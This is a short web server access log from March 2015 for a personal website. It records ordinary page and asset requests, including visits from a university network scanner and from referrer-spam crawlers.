180.76.4.207 - - [04/Mar/2015:10:46:11 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
128.61.240.66 - - [04/Mar/2015:11:29:50 +0000] "GET / HTTP/1.0" 200 2869 "-" "netscan.gtisc.gatech.edu"
71.83.61.37 - - [04/Mar/2015:11:38:30 +0000] "GET / HTTP/1.1" 200 1025 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
37.139.52.23 - - [04/Mar/2015:12:14:49 +0000] "GET / HTTP/1.1" 200 2869 "http://www.msk-new.com/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)"
37.139.52.23 - - [04/Mar/2015:12:14:50 +0000] "GET / HTTP/1.1" 200 2869 "http://www.msk-new.com/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)"
37.139.52.23 - - [04/Mar/2015:12:14:50 +0000] "GET / HTTP/1.1" 200 2869 "http://www.msk-new.com/" "Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.2; SV1)"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET / HTTP/1.1" 200 1025 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/bundle.css HTTP/1.1" 200 10369 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/bundle.js HTTP/1.1" 200 61862 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.133.198.35 - - [04/Mar/2015:12:20:37 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
180.76.4.24 - - [04/Mar/2015:12:48:45 +0000] "GET / HTTP/1.1" 200 2869 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
